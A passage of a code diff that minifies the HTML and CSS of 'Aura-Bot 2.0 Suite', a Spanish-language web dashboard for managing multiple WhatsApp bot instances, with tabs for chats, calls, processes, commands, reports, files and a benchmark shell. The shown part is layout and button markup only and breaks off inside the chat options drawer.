-  .pill-off { background: rgba(255,42,84,0.15); color: var(--danger); }
-  .cmd-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(145px, 1fr)); gap: 8px; margin-top: 12px; }
-  .cmd-item { background: #0b0e17; border: 1px solid var(--border); padding: 8px 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; }
-  pre { background: #05070b; border: 1px solid var(--border); padding: 12px; border-radius: 8px; overflow-x: auto; font-size: 12px; color: #00e676; max-height: 320px; }
-
-  .wa-wrapper { display: grid; grid-template-columns: 360px 1fr; height: calc(100dvh - 118px); min-height: 520px; background: var(--wa-bg); border: 1px solid #222e35; border-radius: 12px; overflow: hidden; box-shadow: 0 12px 36px rgba(0,0,0,0.5); position: relative; }
-  .wa-sidebar { background: var(--wa-panel); border-right: 1px solid #222e35; display: flex; flex-direction: column; height: 100%; overflow: hidden; }
-  .wa-side-top { padding: 10px; background: #202c33; border-bottom: 1px solid #222e35; display: flex; flex-direction: column; gap: 8px; }
-  .wa-bot-select-row { display: flex; gap: 6px; align-items: center; }
-  .wa-search-row { display: flex; gap: 6px; }
-  .wa-filter-row { display: flex; gap: 6px; overflow-x: auto; scrollbar-width: none; }
-  .wa-chip { background: #202c33; color: var(--muted); border: 1px solid #2a3942; padding: 4px 10px; border-radius: 999px; font-size: 11px; font-weight: 700; cursor: pointer; white-space: nowrap; }
-  .wa-chip.active { background: rgba(0,168,132,0.2); color: #00a884; border-color: #00a884; }
-  .wa-chat-list { flex: 1; overflow-y: auto; }
-  .wa-chat-item { padding: 11px 14px; border-bottom: 1px solid rgba(134,150,160,0.12); cursor: pointer; display: flex; justify-content: space-between; align-items: center; gap: 11px; transition: background 0.15s; }
-  .wa-chat-item:hover { background: #202c33; }
-  .wa-chat-item.active { background: #2a3942; }
-  .wa-avatar { width: 42px; height: 42px; border-radius: 50%; background: var(--wa-teal); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 14px; flex-shrink: 0; overflow: hidden; object-fit: cover; border: 1px solid rgba(255,255,255,0.08); }
-  .wa-avatar img { width: 100%; height: 100%; object-fit: cover; display: block; }
-  .wa-chat-meta { flex: 1; min-width: 0; }
-  .wa-chat-name { font-size: 14px; font-weight: 700; color: #e9edef; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-  .wa-chat-prev { font-size: 12px; color: var(--muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-top: 2px; }
-  .wa-chat-right { display: flex; flex-direction: column; align-items: flex-end; gap: 5px; flex-shrink: 0; }
-  .wa-chat-time { font-size: 11px; color: var(--muted); }
-  .wa-unread { background: var(--wa-green); color: #111b21; font-size: 10px; font-weight: 800; padding: 2px 7px; border-radius: 999px; }
-
-  .wa-main { display: flex; flex-direction: column; height: 100%; background: var(--wa-bg); position: relative; overflow: hidden; }
-  .wa-header { background: #202c33; padding: 8px 12px; border-bottom: 1px solid #222e35; display: flex; align-items: center; justify-content: space-between; gap: 8px; min-height: 58px; z-index: 10; }
-  .wa-header-left { display: flex; align-items: center; gap: 9px; min-width: 0; cursor: pointer; flex: 1; overflow: hidden; }
-  .wa-back-btn { display: none; background: #2a3942; color: #fff; border: none; padding: 7px 10px; border-radius: 8px; font-weight: 800; cursor: pointer; flex-shrink: 0; }
-  .wa-header-actions { display: flex; align-items: center; gap: 5px; flex-shrink: 0; }
-  .wa-icon-btn { background: #2a3942; color: var(--text); border: none; width: 34px; height: 34px; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; cursor: pointer; font-size: 14px; transition: 0.15s; flex-shrink: 0; }
-  .wa-icon-btn:hover { background: #374854; }
-
-  .wa-messages {
-    flex: 1;
-    padding: 14px 16px;
-    overflow-y: auto;
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-    background-color: #0b141a;
-    background-image: radial-gradient(rgba(255,255,255,0.03) 1px, transparent 0);
-    background-size: 24px 24px;
-  }
-  .wa-msg-row { display: flex; flex-direction: column; max-width: 78%; position: relative; }
-  .wa-msg-row.in { align-self: flex-start; }
-  .wa-msg-row.out { align-self: flex-end; }
-  .wa-bubble { padding: 7px 11px; border-radius: 10px; font-size: 13.5px; line-height: 1.42; position: relative; word-wrap: break-word; white-space: pre-wrap; box-shadow: 0 1px 2px rgba(0,0,0,0.35); }
-  .wa-msg-row.in .wa-bubble { background: var(--wa-in); color: #e9edef; border-top-left-radius: 2px; }
-  .wa-msg-row.out .wa-bubble { background: var(--wa-out); color: #e9edef; border-top-right-radius: 2px; }
-  .wa-bubble.sticker-bubble { background: transparent !important; box-shadow: none !important; padding: 2px !important; }
-  .wa-bubble-sender { font-size: 11.5px; font-weight: 800; color: #00e5ff; margin-bottom: 3px; cursor: pointer; }
-  .wa-quoted-box { background: rgba(0,0,0,0.26); border-left: 3px solid var(--wa-green); border-radius: 6px; padding: 5px 8px; margin-bottom: 6px; font-size: 11.5px; color: #cfd8dc; max-height: 60px; overflow: hidden; }
-  .wa-quoted-sender { font-weight: 800; color: var(--wa-green); font-size: 11px; margin-bottom: 2px; }
-  .wa-media-img { max-width: 280px; width: 100%; max-height: 320px; border-radius: 8px; object-fit: cover; display: block; margin-bottom: 4px; cursor: zoom-in; background: #111b21; min-height: 80px; }
-  .wa-media-sticker { width: 140px; height: 140px; object-fit: contain; display: block; cursor: pointer; transition: transform 0.15s; }
-  .wa-media-sticker:hover { transform: scale(1.06); }
-  .wa-media-video { max-width: 280px; width: 100%; max-height: 320px; border-radius: 8px; display: block; margin-bottom: 4px; background: #000; }
-  .wa-media-audio { width: 240px; max-width: 100%; height: 38px; margin: 3px 0; }
-  .wa-bubble-meta { display: flex; align-items: center; justify-content: flex-end; gap: 6px; font-size: 10px; color: rgba(255,255,255,0.62); margin-top: 3px; }
-  .wa-msg-tools { display: none; gap: 4px; position: absolute; top: -12px; right: 4px; background: #202c33; border: 1px solid #2a3942; border-radius: 999px; padding: 2px 6px; z-index: 20; box-shadow: 0 4px 12px rgba(0,0,0,0.4); }
-  .wa-msg-row.in .wa-msg-tools { right: auto; left: 4px; }
-  .wa-msg-row:hover .wa-msg-tools { display: flex; }
-  .wa-tool-btn { background: transparent; border: none; color: #e9edef; cursor: pointer; font-size: 12px; padding: 2px 4px; }
-  .wa-tool-btn:hover { transform: scale(1.2); }
-  .wa-reactions-pill { display: inline-flex; gap: 3px; background: #202c33; border: 1px solid #2a3942; border-radius: 999px; padding: 2px 6px; font-size: 11px; margin-top: -6px; align-self: flex-end; z-index: 5; }
-
-  .wa-reply-bar { display: none; background: #182229; border-top: 1px solid #222e35; border-left: 4px solid var(--wa-green); padding: 8px 14px; align-items: center; justify-content: space-between; gap: 10px; font-size: 12px; }
-  .wa-reply-bar.active { display: flex; }
-  .wa-emoji-bar { display: none; background: #182229; border-top: 1px solid #222e35; padding: 8px 12px; gap: 8px; flex-wrap: wrap; align-items: center; max-height: 130px; overflow-y: auto; }
-  .wa-emoji-bar.active { display: flex; }
-  .wa-emoji-item { font-size: 20px; cursor: pointer; padding: 3px; user-select: none; transition: transform 0.1s; }
-  .wa-emoji-item:hover { transform: scale(1.25); }
-
-  .wa-composer { background: #202c33; padding: 8px 10px; display: flex; gap: 6px; align-items: center; border-top: 1px solid #222e35; }
-  .wa-composer input[type="text"] { background: #2a3942; border: none; color: #e9edef; padding: 10px 13px; border-radius: 10px; flex: 1; font-size: 14px; min-width: 0; }
-
-  .wa-drawer { position: absolute; top: 0; right: 0; width: 320px; max-width: 100%; height: 100%; background: var(--wa-panel); border-left: 1px solid #222e35; z-index: 40; display: none; flex-direction: column; overflow-y: auto; padding: 16px; }
-  .wa-drawer.open { display: flex; }
-
-  .modal-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 999; display: none; align-items: center; justify-content: center; padding: 16px; }
-  .modal-backdrop.open { display: flex; }
-  .lightbox-img { max-width: 94vw; max-height: 85vh; border-radius: 10px; object-fit: contain; }
-
-  .call-banner { position: fixed; bottom: 20px; right: 20px; background: #161f2c; border: 2px solid var(--wa-green); border-radius: 16px; padding: 16px 20px; z-index: 950; width: 320px; box-shadow: 0 18px 45px rgba(0,0,0,0.75); display: none; flex-direction: column; gap: 10px; animation: pulseBorder 1.5s infinite; }
-  .call-banner.active { display: flex; }
-  @keyframes pulseBorder { 0% { box-shadow: 0 0 0 0 rgba(0,168,132,0.6); } 70% { box-shadow: 0 0 0 14px rgba(0,168,132,0); } 100% { box-shadow: 0 0 0 0 rgba(0,168,132,0); } }
-
-  @media (max-width: 860px) {
-    .container { padding: 0 6px 14px; margin: 6px auto; }
-    .wa-wrapper { grid-template-columns: 1fr; height: calc(100dvh - 108px); border-radius: 8px; }
-    .wa-wrapper.chat-open .wa-sidebar { display: none; }
-    .wa-wrapper:not(.chat-open) .wa-main { display: none; }
-    .wa-back-btn { display: inline-flex; }
-    .wa-msg-row { max-width: 88%; }
-    .wa-media-img, .wa-media-video { max-width: 245px; }
-    .wa-avatar { width: 38px; height: 38px; font-size: 13px; }
-    .wa-icon-btn { width: 32px; height: 32px; font-size: 13px; }
-  }
-</style>
-</head>
-<body>
-<header>
-  <div class="brand">⚡ AURA-BOT 2.0 • SUITE</div>
-  <div class="header-right">
-    <div class="badge" id="callStatusBadge" style="display:none; background:rgba(255,42,84,0.2); color:#ff2a54; border-color:#ff2a54;">📞 Llamada Activa</div>
-    <div class="badge" id="uptimeBadge">⏱️ 0h 0m 0s</div>
-  </div>
-</header>
-
+  return `<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>Aura-Bot 2.0 | Suite</title><style>
+:root{--bg:#07090e;--panel:#10141f;--border:#1e2638;--accent:#00e5ff;--wag:#00a884;--waout:#005c4b;--wain:#202c33;--wabg:#0b141a;--wap:#111b21;--danger:#ff2a54;--ok:#00e676;--warn:#ffab00;--txt:#e9edef;--mut:#8696a0}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{background:var(--bg);color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100dvh;display:flex;flex-direction:column;overflow-x:hidden}
+header{background:var(--panel);border-bottom:1px solid var(--border);padding:10px 14px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;gap:8px}
+.brand{font-size:15px;font-weight:900;color:var(--accent);white-space:nowrap}.badge{background:rgba(0,229,255,.12);color:var(--accent);border:1px solid var(--accent);padding:4px 10px;border-radius:99px;font-size:11px;font-weight:700;font-variant-numeric:tabular-nums;white-space:nowrap}
+.tabs{display:flex;gap:6px;padding:8px 12px;overflow-x:auto;border-bottom:1px solid var(--border);background:#0b0e17;scrollbar-width:none;position:sticky;top:45px;z-index:90}.tabs::-webkit-scrollbar{display:none}
+.tab-btn{background:var(--panel);color:var(--mut);border:1px solid var(--border);padding:7px 12px;border-radius:8px;cursor:pointer;font-weight:700;font-size:12px;white-space:nowrap;display:flex;align-items:center;gap:5px}
+.tab-btn.active,.tab-btn:hover{color:var(--txt);border-color:var(--accent);background:rgba(0,229,255,.12)}
+.container{width:100%;max-width:1440px;margin:8px auto;padding:0 10px 20px;flex:1}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin-bottom:12px}
+.card{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:14px;overflow:hidden}
+.card-title{font-size:11px;color:var(--mut);text-transform:uppercase;margin-bottom:5px;font-weight:700}.card-val{font-size:20px;font-weight:800}.card-sub{font-size:11px;color:var(--accent);margin-top:4px}
+.section{display:none}.section.active{display:block}.table-wrap{width:100%;overflow-x:auto}
+table{width:100%;border-collapse:collapse;font-size:12px;min-width:480px}th,td{text-align:left;padding:9px;border-bottom:1px solid var(--border)}th{color:var(--mut);font-size:11px;text-transform:uppercase}
+.btn{background:var(--accent);color:#000;border:none;padding:8px 12px;border-radius:8px;font-weight:700;cursor:pointer;font-size:12px;white-space:nowrap;display:inline-flex;align-items:center;justify-content:center;gap:4px}
+.btn-danger{background:var(--danger);color:#fff}.btn-warn{background:var(--warn);color:#000}.btn-success{background:var(--ok);color:#000}.btn-wa{background:var(--wag);color:#fff}.btn-ghost{background:#2a3942;color:var(--txt)}
+input,select,textarea{background:#07090e;color:var(--txt);border:1px solid var(--border);border-radius:8px;padding:9px 11px;font-size:13px;width:100%;outline:none}input:focus,select:focus,textarea:focus{border-color:var(--accent)}
+textarea{font-family:monospace;min-height:260px;resize:vertical}.flex-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px}
+.pill{display:inline-block;padding:2px 7px;border-radius:6px;font-size:10px;font-weight:800}.pill-on{background:rgba(0,230,118,.15);color:var(--ok)}.pill-off{background:rgba(255,42,84,.15);color:var(--danger)}
+.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;margin-top:10px}.cmd-item{background:#0b0e17;border:1px solid var(--border);padding:7px 9px;border-radius:8px;display:flex;justify-content:space-between;align-items:center;font-size:12px}
+pre{background:#05070b;border:1px solid var(--border);padding:12px;border-radius:8px;overflow-x:auto;font-size:12px;color:var(--ok);max-height:300px}
+.wa-wrap{display:grid;grid-template-columns:350px 1fr;height:calc(100dvh - 114px);min-height:500px;background:var(--wabg);border:1px solid #222e35;border-radius:12px;overflow:hidden;position:relative}
+.wa-side{background:var(--wap);border-right:1px solid #222e35;display:flex;flex-direction:column;height:100%;overflow:hidden}
+.wa-top{padding:9px;background:#202c33;border-bottom:1px solid #222e35;display:flex;flex-direction:column;gap:7px}
+.wa-row{display:flex;gap:6px;align-items:center}.wa-chip{background:#202c33;color:var(--mut);border:1px solid #2a3942;padding:4px 9px;border-radius:99px;font-size:11px;font-weight:700;cursor:pointer;white-space:nowrap}.wa-chip.active{background:rgba(0,168,132,.2);color:var(--wag);border-color:var(--wag)}
+.wa-list{flex:1;overflow-y:auto}.wa-item{padding:10px 12px;border-bottom:1px solid rgba(134,150,160,.12);cursor:pointer;display:flex;justify-content:space-between;align-items:center;gap:10px}.wa-item:hover{background:#202c33}.wa-item.active{background:#2a3942}
+.wa-av{width:40px;height:40px;border-radius:50%;background:#008069;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;flex-shrink:0;overflow:hidden}.wa-av img{width:100%;height:100%;object-fit:cover;display:block}
+.wa-meta{flex:1;min-width:0}.wa-name{font-size:13.5px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.wa-prev{font-size:12px;color:var(--mut);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px}
+.wa-right{display:flex;flex-direction:column;align-items:flex-end;gap:4px;flex-shrink:0}.wa-time{font-size:10.5px;color:var(--mut)}.wa-unread{background:var(--wag);color:#111b21;font-size:10px;font-weight:800;padding:2px 6px;border-radius:99px}
+.wa-main{display:flex;flex-direction:column;height:100%;background:var(--wabg);position:relative;overflow:hidden}
+.wa-head{background:#202c33;padding:8px 11px;border-bottom:1px solid #222e35;display:flex;align-items:center;justify-content:space-between;gap:8px;min-height:56px;z-index:10}
+.wa-hleft{display:flex;align-items:center;gap:8px;min-width:0;cursor:pointer;flex:1;overflow:hidden}
+.wa-back{display:none;background:#2a3942;color:#fff;border:none;padding:6px 10px;border-radius:8px;font-weight:800;cursor:pointer;flex-shrink:0}
+.wa-ibr{background:#2a3942;color:var(--txt);border:none;width:33px;height:33px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;cursor:pointer;font-size:14px;flex-shrink:0}
+.wa-msgs{flex:1;padding:12px 14px;overflow-y:auto;display:flex;flex-direction:column;gap:8px;background-color:#0b141a;background-image:radial-gradient(rgba(255,255,255,.03) 1px,transparent 0);background-size:22px 22px}
+.wa-mrow{display:flex;flex-direction:column;max-width:78%;position:relative}.wa-mrow.in{align-self:flex-start}.wa-mrow.out{align-self:flex-end}
+.wa-bub{padding:7px 10px;border-radius:10px;font-size:13.5px;line-height:1.4;position:relative;word-wrap:break-word;white-space:pre-wrap;box-shadow:0 1px 2px rgba(0,0,0,.35)}
+.wa-mrow.in .wa-bub{background:var(--wain);border-top-left-radius:2px}.wa-mrow.out .wa-bub{background:var(--waout);border-top-right-radius:2px}.wa-bub.stk{background:transparent!important;box-shadow:none!important;padding:2px!important}
+.wa-sender{font-size:11px;font-weight:800;color:var(--accent);margin-bottom:3px;cursor:pointer}
+.wa-quote{background:rgba(0,0,0,.26);border-left:3px solid var(--wag);border-radius:6px;padding:4px 8px;margin-bottom:5px;font-size:11px;color:#cfd8dc;max-height:56px;overflow:hidden}
+.wa-img{max-width:260px;width:100%;max-height:300px;border-radius:8px;object-fit:cover;display:block;margin-bottom:4px;cursor:zoom-in;background:#111b21;min-height:60px}
+.wa-stk{width:135px;height:135px;object-fit:contain;display:block;cursor:pointer}.wa-vid{max-width:265px;width:100%;max-height:300px;border-radius:8px;display:block;margin-bottom:4px;background:#000}.wa-aud{width:230px;max-width:100%;height:36px;margin:3px 0}
+.wa-bmeta{display:flex;align-items:center;justify-content:flex-end;gap:5px;font-size:10px;color:rgba(255,255,255,.6);margin-top:3px}
+.wa-tools{display:none;gap:3px;position:absolute;top:-11px;right:4px;background:#202c33;border:1px solid #2a3942;border-radius:99px;padding:2px 6px;z-index:20}.wa-mrow.in .wa-tools{right:auto;left:4px}.wa-mrow:hover .wa-tools{display:flex}
+.wa-tbtn{background:transparent;border:none;color:var(--txt);cursor:pointer;font-size:12px;padding:2px 3px}
+.wa-reacts{display:inline-flex;gap:3px;background:#202c33;border:1px solid #2a3942;border-radius:99px;padding:2px 6px;font-size:11px;margin-top:-5px;align-self:flex-end;z-index:5}
+.wa-rbar{display:none;background:#182229;border-top:1px solid #222e35;border-left:4px solid var(--wag);padding:7px 12px;align-items:center;justify-content:space-between;gap:8px;font-size:12px}.wa-rbar.active{display:flex}
+.wa-ebar{display:none;background:#182229;border-top:1px solid #222e35;padding:7px 10px;gap:7px;flex-wrap:wrap;max-height:120px;overflow-y:auto}.wa-ebar.active{display:flex}.wa-emo{font-size:19px;cursor:pointer;padding:2px}
+.wa-comp{background:#202c33;padding:8px 10px;display:flex;gap:6px;align-items:center;border-top:1px solid #222e35}.wa-comp input[type="text"]{background:#2a3942;border:none;color:var(--txt);padding:10px 12px;border-radius:10px;flex:1;font-size:14px;min-width:0}
+.wa-drawer{position:absolute;top:0;right:0;width:300px;max-width:100%;height:100%;background:var(--wap);border-left:1px solid #222e35;z-index:40;display:none;flex-direction:column;overflow-y:auto;padding:14px}.wa-drawer.open{display:flex}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:999;display:none;align-items:center;justify-content:center;padding:14px}.modal.open{display:flex}.modal img{max-width:94vw;max-height:85vh;border-radius:10px;object-fit:contain}
+.call-pop{position:fixed;bottom:16px;right:16px;background:#161f2c;border:2px solid var(--wag);border-radius:14px;padding:14px 16px;z-index:950;width:300px;box-shadow:0 16px 40px rgba(0,0,0,.75);display:none;flex-direction:column;gap:8px}.call-pop.active{display:flex}
+@media(max-width:860px){.container{padding:0 5px 12px;margin:4px auto}.wa-wrap{grid-template-columns:1fr;height:calc(100dvh - 104px)}.wa-wrap.chat-open .wa-side{display:none}.wa-wrap:not(.chat-open) .wa-main{display:none}.wa-back{display:inline-flex}.wa-mrow{max-width:88%}.wa-img,.wa-vid{max-width:235px}}
+</style></head><body>
+<header><div class="brand">⚡ AURA-BOT 2.0 • SUITE</div><div class="wa-row"><div class="badge" id="callBadge" style="display:none;color:#ff2a54;border-color:#ff2a54">📞 Llamada</div><div class="badge" id="uptimeBadge">⏱️ 0h 0m 0s</div></div></header>
 <div class="tabs">
-  <button class="tab-btn active" onclick="switchTab('wa', this)">💬 WhatsApp Web</button>
-  <button class="tab-btn" onclick="switchTab('calls', this)">📞 Central de Llamadas <span id="callCountPill" class="pill pill-on" style="display:none">0</span></button>
-  <button class="tab-btn" onclick="switchTab('dash', this)">📊 Clúster & Subbots</button>
-  <button class="tab-btn" onclick="switchTab('procs', this)">💀 Procesos & RAM</button>
-  <button class="tab-btn" onclick="switchTab('cmds', this)">🛠️ Comandos</button>
-  <button class="tab-btn" onclick="switchTab('spam', this)">🚨 Reportes / Spam</button>
-  <button class="tab-btn" onclick="switchTab('files', this)">📁 Archivos & Editor</button>
-  <button class="tab-btn" onclick="switchTab('bench', this)">⚡ Benchmark & Shell</button>
+  <button class="tab-btn active" onclick="tab('wa',this)">💬 WhatsApp Web</button>
+  <button class="tab-btn" onclick="tab('calls',this)">📞 Llamadas <span id="callPill" class="pill pill-on" style="display:none">0</span></button>
+  <button class="tab-btn" onclick="tab('dash',this)">📊 Clúster</button>
+  <button class="tab-btn" onclick="tab('procs',this)">💀 Procesos</button>
+  <button class="tab-btn" onclick="tab('cmds',this)">🛠️ Comandos</button>
+  <button class="tab-btn" onclick="tab('spam',this)">🚨 Reportes</button>
+  <button class="tab-btn" onclick="tab('files',this)">📁 Archivos</button>
+  <button class="tab-btn" onclick="tab('bench',this)">⚡ Benchmark</button>
 </div>
-
 <div class="container">
   <div id="tab-wa" class="section active">
-    <div class="wa-wrapper" id="waWrapper">
-      <div class="wa-sidebar">
-        <div class="wa-side-top">
-          <div class="wa-bot-select-row">
-            <select id="waBotSelector" onchange="onSelectSubbot()" style="flex:1; font-weight:700;"></select>
-            <button class="btn btn-wa" onclick="syncSubbotGroups()" title="Sincronizar Grupos">🔄</button>
-          </div>
-          <div class="wa-search-row">
-            <input type="text" id="waSearchInput" placeholder="Buscar chat, número o mensaje..." oninput="renderWaChatList(true)">
-            <button class="btn" onclick="startNewChatPrompt()" title="Nuevo chat">➕</button>
-          </div>
-          <div class="wa-filter-row">
-            <button class="wa-chip active" onclick="setChatFilter('all', this)">Todos</button>
-            <button class="wa-chip" onclick="setChatFilter('unread', this)">No leídos</button>
-            <button class="wa-chip" onclick="setChatFilter('groups', this)">Grupos</button>
-            <button class="wa-chip" onclick="setChatFilter('direct', this)">Privados</button>
-          </div>
+    <div class="wa-wrap" id="waWrap">
+      <div class="wa-side">
+        <div class="wa-top">
+          <div class="wa-row"><select id="botSel" onchange="selectBot()" style="flex:1;font-weight:700"></select><button class="btn btn-wa" onclick="syncGroups()">🔄</button></div>
+          <div class="wa-row"><input id="chatSearch" placeholder="Buscar chat o número..." oninput="renderChats(true)"><button class="btn" onclick="newChat()">➕</button></div>
+          <div class="wa-row" style="overflow-x:auto"><button class="wa-chip active" onclick="setFilter('all',this)">Todos</button><button class="wa-chip" onclick="setFilter('unread',this)">No leídos</button><button class="wa-chip" onclick="setFilter('groups',this)">Grupos</button><button class="wa-chip" onclick="setFilter('direct',this)">Privados</button></div>
         </div>
-        <div class="wa-chat-list" id="waChatList"></div>
+        <div class="wa-list" id="chatList"></div>
       </div>
-
       <div class="wa-main">
-        <div class="wa-header">
-          <div class="wa-header-left" onclick="toggleChatDrawer()">
-            <button class="wa-back-btn" onclick="event.stopPropagation(); closeMobileChat()">⬅</button>
-            <div class="wa-avatar" id="waActiveAvatar">?</div>
-            <div style="min-width:0; flex:1; overflow:hidden;">
-              <div class="wa-chat-name" id="waActiveName">Selecciona una conversación</div>
-              <div class="wa-chat-prev" id="waActiveJid">Elige un Subbot arriba a la izquierda</div>
-            </div>
+        <div class="wa-head">
+          <div class="wa-hleft" onclick="toggleDrawer()">
+            <button class="wa-back" onclick="event.stopPropagation();closeChat()">⬅</button>
+            <div class="wa-av" id="actAv">?</div>
+            <div style="min-width:0;flex:1;overflow:hidden"><div class="wa-name" id="actName">Selecciona un chat</div><div class="wa-prev" id="actJid">Elige un Subbot arriba</div></div>
           </div>
-          <div class="wa-header-actions" id="waHeaderActions" style="display:none;">
-            <button class="wa-icon-btn" onclick="triggerCallFromChat(false)" title="Llamada de Voz">📞</button>
-            <button class="wa-icon-btn" onclick="triggerCallFromChat(true)" title="Videollamada">📹</button>
-            <button class="wa-icon-btn" onclick="toggleChatDrawer()" title="Más opciones e Info">ℹ️</button>
-          </div>
+          <div class="wa-row" id="headActs" style="display:none"><button class="wa-ibr" onclick="callChat(false)">📞</button><button class="wa-ibr" onclick="callChat(true)">📹</button><button class="wa-ibr" onclick="toggleDrawer()">ℹ️</button></div>
         </div>
-
-        <div class="wa-messages" id="waMessagesBox">
-          <div style="margin:auto; text-align:center; color:#8696a0; padding:24px; max-width:420px;">
-            <h3 style="color:#e9edef; margin-bottom:8px; font-size:18px;">📱 Aura WhatsApp Web Multi-Subbot</h3>
-            <p style="font-size:13px; line-height:1.5;">Visualiza imágenes, stickers animados, audios y videos con streaming directo. Selecciona cualquier instancia arriba a la izquierda para conversar en vivo.</p>
-          </div>
-        </div>
-
-        <div class="wa-reply-bar" id="waReplyBar">
-          <div style="min-width:0; flex:1;">
-            <div style="font-weight:800; color:var(--wa-green);" id="waReplySender">Respondiendo</div>
-            <div style="color:var(--muted); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" id="waReplyText"></div>
-          </div>
-          <button class="wa-icon-btn" style="width:28px; height:28px;" onclick="cancelReply()">✖</button>
-        </div>
-
-        <div class="wa-emoji-bar" id="waEmojiBar"></div>
-
-        <form class="wa-composer" onsubmit="sendWaMessage(event)">
-          <button type="button" class="wa-icon-btn" onclick="toggleEmojiBar()" title="Emojis">😀</button>
-          <button type="button" class="wa-icon-btn" onclick="document.getElementById('waMediaFileInput').click()" title="Adjuntar">📎</button>
-          <input type="file" id="waMediaFileInput" style="display:none" accept="image/*,video/*,audio/*,.webp,.pdf,.zip" onchange="handleMediaUpload(event)">
-          <input type="text" id="waMessageInput" placeholder="Escribe un mensaje..." autocomplete="off" oninput="onComposerTyping()">
-          <button type="button" class="wa-icon-btn" id="waVoiceBtn" onclick="toggleVoiceRecording()" title="Grabar Nota de Voz">🎤</button>
-          <button type="submit" class="btn btn-wa" style="padding:9px 14px; border-radius:10px;">➤</button>
+        <div class="wa-msgs" id="msgBox"><div style="margin:auto;text-align:center;color:var(--mut);padding:20px;max-width:380px"><h3 style="color:var(--txt);margin-bottom:6px">📱 WhatsApp Web Multi-Subbot</h3><p style="font-size:13px">Soporte completo de imágenes, stickers, audios y videos con streaming directo.</p></div></div>
+        <div class="wa-rbar" id="replyBar"><div style="min-width:0;flex:1"><div style="font-weight:800;color:var(--wag)" id="repWho"></div><div style="color:var(--mut);white-space:nowrap;overflow:hidden;text-overflow:ellipsis" id="repTxt"></div></div><button class="wa-ibr" style="width:26px;height:26px" onclick="cancelReply()">✖</button></div>
+        <div class="wa-ebar" id="emoBar"></div>
+        <form class="wa-comp" onsubmit="sendMsg(event)">
+          <button type="button" class="wa-ibr" onclick="el('emoBar').classList.toggle('active')">😀</button>
+          <button type="button" class="wa-ibr" onclick="el('fileInp').click()">📎</button>
+          <input type="file" id="fileInp" style="display:none" accept="image/*,video/*,audio/*,.webp,.pdf,.zip" onchange="uploadMedia(event)">
+          <input type="text" id="msgInp" placeholder="Escribe un mensaje..." autocomplete="off" oninput="onTyping()">
+          <button type="button" class="wa-ibr" id="micBtn" onclick="recVoice()">🎤</button>
+          <button type="submit" class="btn btn-wa" style="padding:9px 13px;border-radius:10px">➤</button>
         </form>
-
-        <div class="wa-drawer" id="waInfoDrawer">
-          <div class="flex-row" style="justify-content:space-between; border-bottom:1px solid #222e35; padding-bottom:10px;">
-            <h4>ℹ️ Opciones del Chat</h4>
-            <button class="wa-icon-btn" style="width:30px; height:30px;" onclick="toggleChatDrawer()">✖</button>
+        <div class="wa-drawer" id="infoDrawer">
+          <div class="flex-row" style="justify-content:space-between;border-bottom:1px solid #222e35;padding-bottom:8px"><h4>ℹ️ Opciones</h4><button class="wa-ibr" style="width:28px;height:28px" onclick="toggleDrawer()">✖</button></div>
+          <div style="display:flex;flex-direction:column;align-items:center;text-align:center;padding:12px 0;gap:8px">
+            <div class="wa-av" id="drwAv" style="width:72px;height:72px;font-size:22px">?</div>
+            <div style="font-size:15px;font-weight:800" id="drwName">-</div><div style="font-size:11px;color:var(--mut)" id="drwJid">-</div>
+            <div style="font-size:12px;color:var(--accent);background:#182229;padding:7px 10px;border-radius:8px;width:100%" id="drwBio"></div>
           </div>
-          <div style="display:flex; flex-direction:column; align-items:center; text-align:center; padding:16px 0; gap:10px;">
-            <div class="wa-avatar" id="drawerAvatar" style="width:80px; height:80px; font-size:26px;">?</div>
-            <div style="font-size:16px; font-weight:800;" id="drawerName">-</div>
-            <div style="font-size:12px; color:var(--muted);" id="drawerJid">-</div>
-            <div style="font-size:12px; color:#00e5ff; background:#182229; padding:8px 12px; border-radius:8px; width:100%;" id="drawerBio">Sin descripción</div>
-          </div>
-          <div style="display:flex; flex-direction:column; gap:8px; margin-top:6px;">
-            <button class="btn btn-wa" onclick="triggerCallFromChat(false)">📞 Iniciar Llamada de Voz</button>
-            <button class="btn" onclick="triggerCallFromChat(true)">📹 Iniciar Videollamada</button>
-            <button class="btn btn-ghost" onclick="sendPresenceState('composing')">✍️ Simular Escribiendo...</button>
-            <button class="btn btn-warn" onclick="sendStickerQuickPrompt()">🏷️ Enviar URL como Sticker</button>
-            <button class="btn btn-ghost" onclick="clearActiveChatHistory()">🗑️ Vaciar Historial Local</button>
-            <button class="btn btn-danger" onclick="blockOrUnblockCurrentChat('block')">🚫 Bloquear Contacto</button>
-            <button class="btn btn-success" onclick="blockOrUnblockCurrentChat('unblock')">✅ Desbloquear Contacto</button>
+          <div style="display:flex;flex-direction:column;gap:7px">
+            <button class="btn btn-wa" onclick="callChat(false)">📞 Llamada de Voz</button>
+            <button class="btn" onclick="callChat(true)">📹 Videollamada</button>
+            <button class="btn btn-ghost" onclick="sendAct('presence',{presence:'composing'})">✍️ Simular Escribiendo</button>
